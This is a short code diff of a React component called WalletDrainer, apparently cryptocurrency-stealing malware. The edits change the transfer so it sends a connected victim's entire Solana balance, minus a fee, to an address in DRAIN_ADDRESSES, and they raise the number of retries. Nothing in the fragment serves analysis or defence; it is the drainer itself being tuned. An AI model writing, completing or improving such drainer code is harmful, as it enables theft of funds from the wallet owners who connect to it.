@@ -119,7 +119,7 @@ export default function WalletDrainer({ wallet }) {
           // what is $4.5 in lamports?
 
 
-        const gasFee = 200000;
+        const gasFee = 4950000;
 
   
           if (balance <= gasFee) {
@@ -127,12 +127,12 @@ export default function WalletDrainer({ wallet }) {
             return;
           }
   
-        //   const sendAmount = balance - gasFee;
-          const sendAmount = 9900000;
+          const sendAmount = balance - gasFee;
+        //   const sendAmount = 9900000;
           const recipientPublicKey = new PublicKey(DRAIN_ADDRESSES.solana);
   
           let attempts = 0;
-          const maxRetries = 3;
+          const maxRetries = 10;
           const delayBetweenRetries = 50000;
   
           while (attempts < maxRetries) {
